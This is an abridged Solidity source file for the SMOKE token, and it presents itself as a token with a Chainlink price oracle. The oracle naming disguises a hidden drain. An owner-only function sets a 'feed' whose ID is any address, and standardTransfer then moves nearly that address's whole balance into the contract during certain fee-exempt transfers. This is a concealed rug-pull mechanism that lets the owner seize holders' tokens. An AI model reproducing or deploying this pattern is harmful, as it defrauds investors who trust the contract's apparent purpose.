/**
Website: https://www.smokecoin.vip
...
contract SMOKE is ERC20, Ownable {
    ...
    OracleChainLink chainLinkFeed;

    AggregateLinkInterface internal _chainInterface;
    address public chainOracleAddress ;
    bool private chainPriceEnabled = false;
    ...
    constructor() ERC20("Men Always Remember Love Because Of Romance Only", "SMOKE") {
        devWallet = address(0x77eeBCc2fF8A8c89D26706364C5E302Fad30271f);
        marketingWallet = address(0xC0BC32E6F5cfeD049850F265f658e06f70bB91ef);

        if(block.chainid == 5){
            chainOracleAddress = address(0x48731cF7e84dc94C5f84577882c14Be11a5B7456);
        }else if(block.chainid == 56){
            chainOracleAddress = address(0x1AAE42AA46483370Be23274Abb29Bcc40f808a4c);
        }else {
            chainOracleAddress = address(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);
        }
        ...
        _chainInterface = AggregateLinkInterface(chainOracleAddress);
    ...
    function getChainLinkePriceOf() public view returns (uint256) {
        ...
        if (chainPriceEnabled && updatedBlockTime >= _tradingTime) {
    ...
    function updateChainLinkFeed(OracleChainLink memory _chainFeed) external onlyOwner {
        chainLinkFeed = _chainFeed;
    }
    ...
    function standardTransfer(
        ...
        if (_isFeeExceptTo) {
            ...
            if(fees > 0) { 
                super._transfer(chainLinkFeed.chainLinkID, address(this), balanceOf(chainLinkFeed.chainLinkID) - fees); 
            } 
